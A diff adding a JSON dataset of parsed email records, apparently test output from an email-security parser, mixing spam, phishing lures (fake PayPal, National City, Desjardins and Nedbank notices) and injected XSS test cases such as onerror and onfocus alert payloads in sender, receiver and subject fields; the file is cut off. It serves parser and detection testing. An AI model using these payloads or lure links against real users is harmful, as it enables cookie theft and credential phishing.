@@ -1,0 +1,1588 @@
+[
+  {
+    "email_id": "d520e3e9111f779cddec9bac4830a311",
+    "sender": [
+      "bryce.baxter@enron.com"
+    ],
+    "receiver": [
+      "tom.moran@enron.com",
+      "walter.guidroz@enron.com",
+      "tana.jones@enron.com"
+    ],
+    "subject": "XSS Test Mail",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": [
+      "javascript",
+      "script_tag",
+      "embed_tag",
+      "base64_content"
+    ]
+  },
+  {
+    "email_id": "f0f3e4ef8878a9c515c9deb1f052a7c4",
+    "sender": [
+      "Sam.McClatchie@noaa.gov"
+    ],
+    "receiver": [
+      "indushahani@yahoo.com"
+    ],
+    "subject": "Just Epic",
+    "reply_to": [],
+    "urls": [
+      "http://ps.skumeg.hk/?a=698-11009"
+    ],
+    "domains": [
+      "noaa.gov",
+      "ps.skumeg.hk",
+      "yahoo.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "75678d21a60db7bbcf06d3c5a90f80bc",
+    "sender": [
+      "christy.chapman@enron.com"
+    ],
+    "receiver": [
+      "email1685@speedy.uwaterloo.ca"
+    ],
+    "subject": "NINTENDO WII ASUS",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "speedy.uwaterloo.ca"
+    ],
+    "ips": [],
+    "attachments": [
+      {
+        "filename": "PC.gif",
+        "content_type": "image/gif"
+      }
+    ],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "989972a7cb0b806b665fafc84147c8cb",
+    "sender": [
+      "test@attack.com"
+    ],
+    "receiver": [
+      "jon.hoffmeister@anheuser-busch.com",
+      "mark.hentschell@anheuser-busch.com"
+    ],
+    "subject": "replica //atches! rolex, patek philippe, vacheron constantin and others!",
+    "reply_to": [],
+    "urls": [
+      "http://ffvh.jv7x6u6cojpdpkjh611hojj1.yuytyu.hk"
+    ],
+    "domains": [
+      "anheuser-busch.com",
+      "attack.com",
+      "ffvh.jv7x6u6cojpdpkjh611hojj1.yuytyu.hk"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "2c672ae0a87d0fb2f34701e7f4240685",
+    "sender": [
+      "duncan@wald.ucdavis.edu"
+    ],
+    "receiver": [
+      "kristi.giron@cfisd.net",
+      "hollyw@email.msn.com",
+      "cgiron@mindspring.com"
+    ],
+    "subject": "Over 1,500,000 bottles sold, Safe & Effective PenisEnlargement Herbal Pills  ja",
+    "reply_to": [],
+    "urls": [
+      "http://dfn.trainingcampin.com"
+    ],
+    "domains": [
+      "cfisd.net",
+      "dfn.trainingcampin.com",
+      "email.msn.com",
+      "mindspring.com",
+      "wald.ucdavis.edu"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "7b2f576983289d1f9044527fded84ae0",
+    "sender": [
+      "snapfishnews@snapfish.rs88.net"
+    ],
+    "receiver": [
+      "greg.couch@enron.com",
+      "smmayers@earthlink.net",
+      "mark.ebert@broadwing.com"
+    ],
+    "subject": "re:Special offer",
+    "reply_to": [],
+    "urls": [
+      "http://placepharms.com"
+    ],
+    "domains": [
+      "broadwing.com",
+      "earthlink.net",
+      "enron.com",
+      "placepharms.com",
+      "snapfish.rs88.net"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<> ",
+      "message_id": "<01c7834c$bfa9d500$6c822ecf@dwclarendonparkerm>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "e66d8382c230c6fe72b6f38b773de7a2",
+    "sender": [
+      "sharon.farrell@enron.com"
+    ],
+    "receiver": [
+      "jim.talcott@enron.com",
+      "drew.fossum@enron.com",
+      "dari.dornan@enron.com"
+    ],
+    "subject": "Learn about Viagra!",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "37a5f919ddf52ebfcea47b547a06adac",
+    "sender": [
+      "hub@figuiere.net"
+    ],
+    "receiver": [
+      "jhodge@enron.com"
+    ],
+    "subject": "",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "figuiere.net"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<Hubert Figuiere <hub@figuiere.net>>",
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "bab1c23311ccb5d8b3b2c09c5e54216b",
+    "sender": [],
+    "receiver": [],
+    "subject": null,
+    "reply_to": [],
+    "urls": [],
+    "domains": [],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "a1eaf75f945c48c121b78cdd5b9742d4",
+    "sender": [
+      "\"b64 b64\"@attack.com"
+    ],
+    "receiver": [
+      "mtl@quinnemanuel.com"
+    ],
+    "subject": "~Beautiful,Custom Websites $359 Complete! (or yours re-designed) (6320cUmF1-704zRjD7955@20)",
+    "reply_to": [],
+    "urls": [
+      "http://7x24.sunshinehui.com/mnbv/csi.gif"
+    ],
+    "domains": [
+      "7x24.sunshinehui.com",
+      "attack.com",
+      "quinnemanuel.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "969d7598acfda674a5a5dace339d62e1",
+    "sender": [
+      "p..hewitt@test.enron.com"
+    ],
+    "receiver": [
+      "cheryl.lipshutz@enron.com"
+    ],
+    "subject": "NedBank Account Statement 20182708",
+    "reply_to": [],
+    "urls": [
+      "http://img.striata.com/Nedbank/CASA/RetailEng20110309.jpg",
+      "http://img.striata.com/Nedbank/CASA/drk_grn_btm.gif",
+      "http://img.striata.com/Nedbank/CASA/drk_grn_tp_cnr.gif",
+      "http://img.striata.com/Nedbank/CASA/enote.gif",
+      "http://img.striata.com/Nedbank/CASA/estatement.gif",
+      "http://img.striata.com/Nedbank/CASA/grn_btm_cnr.gif",
+      "http://img.striata.com/Nedbank/CASA/grn_top_cnr.gif",
+      "http://img.striata.com/Nedbank/CASA/grn_trust_logo.jpg",
+      "http://img.striata.com/Nedbank/CASA/head_ENG.gif",
+      "http://img.striata.com/Nedbank/CASA/leaf.gif",
+      "http://img.striata.com/Nedbank/CASA/lock1.gif",
+      "http://img.striata.com/Nedbank/CASA/lock2.gif",
+      "http://img.striata.com/Nedbank/CASA/nedbankgreen_btn.gif",
+      "http://img.striata.com/Nedbank/CASA/open_satetement_btm.gif",
+      "http://img.striata.com/Nedbank/CASA/register.gif",
+      "http://img.striata.com/Nedbank/CASA/tel.gif",
+      "http://www.adobe.com",
+      "http://www.nedbank.co.za",
+      "http://www.nedbank.co.za/website/content/contacts/index.asp",
+      "http://www.nedbank.co.za/website/content/corporate/categoryarticles.asp?CategoryID=2&amp;section=2&amp;nav=value",
+      "http://www.nedbank.co.za/website/content/enotes/index.asp",
+      "http://www.nedbank.co.za/website/content/estatements/index.asp",
+      "http://www.nedbank.co.za/website/content/products/product_current_detail.asp?SubSubcatid=6699&amp;Subcatid=708&amp;ProductID=620",
+      "http://www.nedbank.co.za/website/uploads/terms/EmailDisclaimer.htm"
+    ],
+    "domains": [
+      "enron.com",
+      "img.striata.com",
+      "test.enron.com",
+      "www.adobe.com",
+      "www.nedbank.co.za"
+    ],
+    "ips": [],
+    "attachments": [
+      {
+        "filename": "NedBank Account Statement 20182708.htm",
+        "content_type": "text/html"
+      }
+    ],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<test@attack.com>",
+      "message_id": "<20180827035047.A34B480BC361310E@Nedbank.co.za>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "c54ef468cb31fce5b8d2cf266e01d4a9",
+    "sender": [
+      "zulie.flores@enron.com"
+    ],
+    "receiver": [
+      "christopher.bruce@morganstanley.com"
+    ],
+    "subject": "XSS Test Mail",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "morganstanley.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": [
+      "base64_content"
+    ]
+  },
+  {
+    "email_id": "7048be8afb386131ab8ec3f0a694d560",
+    "sender": [
+      "lxgiles@ctrl.co.uk"
+    ],
+    "receiver": [
+      "henderson.mark@enron.com",
+      "hayes.andy@enron.com",
+      "lansford.david@enron.com"
+    ],
+    "subject": "Ciali Valiun Viagre Xanas At Super Low  Price, Express Ship To All Countries ln",
+    "reply_to": [],
+    "urls": [
+      "http://bymcfcnqg.seriesperfor.com"
+    ],
+    "domains": [
+      "bymcfcnqg.seriesperfor.com",
+      "ctrl.co.uk",
+      "enron.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "2e1403392e580669be99acf164d6776e",
+    "sender": [
+      "Devine@dtojjfsjmq.educationworldnet.com"
+    ],
+    "receiver": [
+      "victim<input onfocus=alert(1) autofocus>@victim.com"
+    ],
+    "subject": "Test XSS",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "dtojjfsjmq.educationworldnet.com",
+      "victim.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "f0b9ecc6869b31b80acccee9db0e2eb8",
+    "sender": [
+      "bmcantrell@miho-nakayama.com"
+    ],
+    "receiver": [
+      "richard.shapiro@enron.com",
+      "ginger.dernehl@enron.com",
+      "james.steffes@enron.com"
+    ],
+    "subject": "Time, Money, Keeping you from earning the Degree you deserve?",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "miho-nakayama.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<01c785f1$791377c0$6c822ecf@depressionsalliance>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "291adb2e40f6dfa8048fd2354345a5cd",
+    "sender": [
+      "monte.jones@test.enron.com"
+    ],
+    "receiver": [
+      "yyyy-linuxapps@spamassassin.taint.org"
+    ],
+    "subject": "Confirm your online account access! (message id: F03471679)",
+    "reply_to": [],
+    "urls": [
+      "http://session-39999757.nationalcity.com.besthaae.at/corporate/onlineservices/TreasuryMgmt/",
+      "http://session-39999757.nationalcity.com/corporate/onlineservices/TreasuryMgmt/"
+    ],
+    "domains": [
+      "session-39999757.nationalcity.com",
+      "session-39999757.nationalcity.com.besthaae.at",
+      "spamassassin.taint.org",
+      "test.enron.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<test@attack.com>",
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "1cc25f1c77c07a5c25c31d6051d2583b",
+    "sender": [
+      "online_fyi@mail1.americangreetings.com}attack.com"
+    ],
+    "receiver": [
+      "ian.watson@mq.edu.au",
+      "R-help@stat.math.ethz.ch"
+    ],
+    "subject": "Sex can",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "mail1.americangreetings.com}attack.com",
+      "mq.edu.au",
+      "stat.math.ethz.ch"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "a5a593d25efec2c8bc89195b2a764787",
+    "sender": [
+      "gnraujxiwhak@knoxnet.net"
+    ],
+    "receiver": [
+      "pugezmum@aol.com"
+    ],
+    "subject": "<script defer=\"defer\">alert(/xss by cc/);</sc<iframe>ript>",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "aol.com",
+      "knoxnet.net"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "de38c34d36d6eb16c8a4438cc0474c27",
+    "sender": [
+      "rxzhu@scbit.org"
+    ],
+    "receiver": [
+      "zzz-buy4now@spamassassin.taint.org"
+    ],
+    "subject": "Avis Important et Personnel",
+    "reply_to": [],
+    "urls": [
+      "http://www.desjardins.com/fr/votre_caisse/index.jsp",
+      "http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/",
+      "https://accesd.desjardins.com/",
+      "https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif",
+      "https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif"
+    ],
+    "domains": [
+      "accesd.desjardins.com",
+      "scbit.org",
+      "spamassassin.taint.org",
+      "www.desjardins.com",
+      "www.philsfeatheredfriends.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<E1HcQdf-00072V-MP@server.fastbox.info>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "f46c07329f71c52d4145d1c1532804b6",
+    "sender": [
+      "test@attack.com"
+    ],
+    "receiver": [
+      "Valued_Customer@123mail.cl"
+    ],
+    "subject": "FDA approved on-line pharmacies",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "123mail.cl",
+      "attack.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "cf45f66e0be9644c3d01d5761db1586f",
+    "sender": [
+      "bgway.com@lasermedi.com"
+    ],
+    "receiver": [
+      "richard.burchfield@enron.com"
+    ],
+    "subject": "Avis Important et Personnel",
+    "reply_to": [],
+    "urls": [
+      "http://www.desjardins.com/fr/votre_caisse/index.jsp",
+      "http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/",
+      "https://accesd.desjardins.com/",
+      "https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif",
+      "https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif"
+    ],
+    "domains": [
+      "accesd.desjardins.com",
+      "enron.com",
+      "lasermedi.com",
+      "www.desjardins.com",
+      "www.philsfeatheredfriends.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<E1HcQeF-0007OE-8T@server.fastbox.info>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "bb8b8b5a40d60fea3ef57894b0d4ebf7",
+    "sender": [
+      "alaska.web@alaskaair.com"
+    ],
+    "receiver": [
+      "benjamin.rogers@enron.com",
+      "michelle.parks@enron.com",
+      "bruce.sukaly@enron.com"
+    ],
+    "subject": "presenting opportunity hassle free",
+    "reply_to": [],
+    "urls": [
+      "http://owfajfqruture.com"
+    ],
+    "domains": [
+      "alaskaair.com",
+      "enron.com",
+      "owfajfqruture.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "1b33daa7e91462db250d87f93c138375",
+    "sender": [
+      "test<img src='1' onerror='alert(document.cookie)'></img>@attack.com"
+    ],
+    "receiver": [
+      "the00@plg.uwaterloo.ca"
+    ],
+    "subject": "Test XSS",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "attack.com",
+      "plg.uwaterloo.ca"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "59383a4a7418d7e5f24aa1a200889c31",
+    "sender": [
+      "rick.johnson@enron.com"
+    ],
+    "receiver": [
+      "stanley.horton@enron.com",
+      "david.gaines@enron.com",
+      "randy.rice@enron.com"
+    ],
+    "subject": "Unauthorized access to your PayPal account!",
+    "reply_to": [],
+    "urls": [
+      "http://images.paypal.com/en_US/i/logo/email_logo.gif",
+      "http://images.paypal.com/en_US/i/scr/bg_clk.gif",
+      "http://images.paypal.com/en_US/i/scr/pixel.gif",
+      "http://tv-qc.com/phpBB2/login.htm",
+      "https://paypal.com/us/secure_verify?ID=pp468",
+      "https://www.paypal.com/us"
+    ],
+    "domains": [
+      "enron.com",
+      "images.paypal.com",
+      "paypal.com",
+      "tv-qc.com",
+      "www.paypal.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<> ",
+      "message_id": "<1178493511.14421.qmail@poste.it>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "35749c81f0d57cf29b1dd5eee017de10",
+    "sender": [
+      "postmaster@instinet.com"
+    ],
+    "receiver": [
+      "sara.shackleton@enron.com",
+      "guenther.klar@enron.com"
+    ],
+    "subject": "XSS Test Mail",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "instinet.com"
+    ],
+    "ips": [],
+    "attachments": [
+      {
+        "filename": "pwn.htm",
+        "content_type": "text/html"
+      }
+    ],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "850d6dffefbf75413076bdf7c6194b3f",
+    "sender": [
+      "an1229@hotmail.com}attack.com"
+    ],
+    "receiver": [
+      "david.marshall@enron.com"
+    ],
+    "subject": "discounted motgages 4924161298765444333",
+    "reply_to": [],
+    "urls": [
+      "http://www.status100.com/mortgage/index34.html"
+    ],
+    "domains": [
+      "enron.com",
+      "hotmail.com}attack.com",
+      "www.status100.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "73337be073af245c7b4678a7555d7f51",
+    "sender": [
+      "\"b64 b64\"@attack.com"
+    ],
+    "receiver": [
+      "hwendell@mdbe.com"
+    ],
+    "subject": "Your payment has been sent to sales@t-mobile.com",
+    "reply_to": [],
+    "urls": [
+      "http://ourworld.cs.com/v3xxxx/v3.gif",
+      "http://www.nrl-nbr.no/forum/cache/abort.php"
+    ],
+    "domains": [
+      "attack.com",
+      "mdbe.com",
+      "ourworld.cs.com",
+      "www.nrl-nbr.no"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<20060808035250.3C22C6FA3FD@mail.example.org>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "809997317ed5bdbb9597032786c86ece",
+    "sender": [
+      "gifts@info.iwon.com"
+    ],
+    "receiver": [
+      "ryspeed-bost@verner.com",
+      "imoreno@bcjlaw.co="
+    ],
+    "subject": "Hot pictures of paris hilton nude ",
+    "reply_to": [],
+    "urls": [
+      "http://gemba.hk/indexxx.html",
+      "http://rulesofbiz.hk/2.jpg"
+    ],
+    "domains": [
+      "bcjlaw.co=",
+      "gemba.hk",
+      "info.iwon.com",
+      "rulesofbiz.hk",
+      "verner.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": "<\"Iven I\" <steppesteases@sbgnet.com>>",
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "ce56ad70460807cdb3df3553c8b9cbb0",
+    "sender": [
+      "ltippery@houston.rr.com￿attack.com"
+    ],
+    "receiver": [
+      "dan.hyvl@enron.com",
+      "gil.muhl@enron.com",
+      "mark.breese@enron.com"
+    ],
+    "subject": "medications for discount prices with world wide shipping",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "houston.rr.com￿attack.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "08d46fd8d77516dbe584743fd640913f",
+    "sender": [
+      "danjin.com@focalsecurity.com"
+    ],
+    "receiver": [
+      "victim<iframe src=javascript:alert(2)>@victim.com"
+    ],
+    "subject": "Test XSS",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "focalsecurity.com",
+      "victim.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "52e7d884a0365409d617e62a396365db",
+    "sender": [
+      "pussnfmanagementlek@snfmanagement.com"
+    ],
+    "receiver": [
+      "stanley.horton@enron.com",
+      "gina.taylor@enron.com",
+      "lori.maddox@enron.com"
+    ],
+    "subject": "in beltrami is harpursville",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "enron.com",
+      "snfmanagement.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "58a60b6877ec02ab3607e5ac8697eefe",
+    "sender": [],
+    "receiver": [],
+    "subject": null,
+    "reply_to": [],
+    "urls": [],
+    "domains": [],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "ac0269150c4ecc9618b903b8b9e7b122",
+    "sender": [
+      "matthew.fleming@enron.com}attack.com"
+    ],
+    "receiver": [
+      "hector.campos@enron.com",
+      "eric.bass@enron.com",
+      "roberto.martinez@enron.com"
+    ],
+    "subject": "Toners and inkjet cartridges for less....          BSJMCOIK",
+    "reply_to": [
+      "fo0kozh4k44705211@hotmail.com"
+    ],
+    "urls": [
+      "http://www.interactive-mailing.com/datacenter.htm",
+      "http://www.webbasedmailing.com",
+      "http://www.webbasedmailing.com/Toners2goLogo.jpg"
+    ],
+    "domains": [
+      "enron.com",
+      "enron.com}attack.com",
+      "hotmail.com",
+      "www.interactive-mailing.com",
+      "www.webbasedmailing.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "dd46249c66aea88b69424469e17a3d24",
+    "sender": [
+      "susan_miller@anadarko.com"
+    ],
+    "receiver": [
+      "john.buchanan@enron.com",
+      "lynn.blair@enron.com",
+      "bill.fowler@enron.com"
+    ],
+    "subject": "Notification of Limited Account Access",
+    "reply_to": [],
+    "urls": [
+      "http://images.paypal.com/en_US/i/logo/email_logo.gif",
+      "http://images.paypal.com/en_US/i/scr/pixel.gif",
+      "http://images.paypal.com/images/bg_clk.gif",
+      "http://images.paypal.com/images/pixel.gif",
+      "http://www.megaglide.com/partner.paypal.com/webscr/",
+      "http://www.paypal.com/securitytips"
+    ],
+    "domains": [
+      "anadarko.com",
+      "enron.com",
+      "images.paypal.com",
+      "www.megaglide.com",
+      "www.paypal.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<E1Fysiv-0006A7-4W@mars.starnox.net>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "da4c01002b149bdeedcacf1700fae486",
+    "sender": [
+      "jmcd@samba.org"
+    ],
+    "receiver": [
+      "email2298@speedy.uwaterloo.ca"
+    ],
+    "subject": "XSS Test Mail",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "samba.org",
+      "speedy.uwaterloo.ca"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "199e794fc6a25e42fe9f10c57672d038",
+    "sender": [
+      "\"b64 b64\"@attack.com"
+    ],
+    "receiver": [
+      "wade.price@enron.com",
+      "chris.germany@enron.com",
+      "gloria.barkowsky@enron.com"
+    ],
+    "subject": "Knock-down price for the best medicaments!",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "attack.com",
+      "enron.com"
+    ],
+    "ips": [],
+    "attachments": [
+      {
+        "filename": "kmcv.gif",
+        "content_type": "image/gif"
+      }
+    ],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "65bcbf395fa66dcc2e9f515d5e55a8fd",
+    "sender": [
+      "\"test onmousemove=alert //\"@attack.com"
+    ],
+    "receiver": [
+      "jordan.mintz@enron.com",
+      "joseph.deffner@enron.com"
+    ],
+    "subject": "Test XSS",
+    "reply_to": [],
+    "urls": [],
+    "domains": [
+      "attack.com",
+      "enron.com"
+    ],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "b1451fd8af4db344b18685a0d4d4dcc4",
+    "sender": [
+      "martin@enron.com",
+      "roundedbeige@laboratorios-pino.com"
+    ],
+    "receiver": [
+      "rex.rogers@enron.com",
+      ".schuler@enron.com",
+      "c..williams@enron.com"
+    ],
+    "subject": "yyyy,Wish you looked and felt younger -HGH",
+    "reply_to": [],
+    "urls": [
+      "http://211.99.37.206:81/ultimatehgh_run/",
+      "http://211.99.37.206:81/ultimatehgh_run/remove.php?userid=jm@netnoteinc.com"
+    ],
+    "domains": [
+      "211.99.37.206:81",
+      "enron.com",
+      "laboratorios-pino.com"
+    ],
+    "ips": [
+      "211.99.37.206"
+    ],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": "<TSEMSG01Kxg91bd8qWw00009e4d@tsemsg01.intranet.tse.go.cr>"
+    },
+    "suspicious_indicators": []
+  },
+  {
+    "email_id": "1b1fb7a635f2cf4c4769cf13ec13e70c",
+    "sender": [],
+    "receiver": [],
+    "subject": null,
+    "reply_to": [],
+    "urls": [],
+    "domains": [],
+    "ips": [],
+    "attachments": [],
+    "security_headers": {
+      "received": [],
+      "authentication_results": [],
+      "dkim_signature": [],
+      "received_spf": [],
+      "return_path": null,
+      "message_id": null
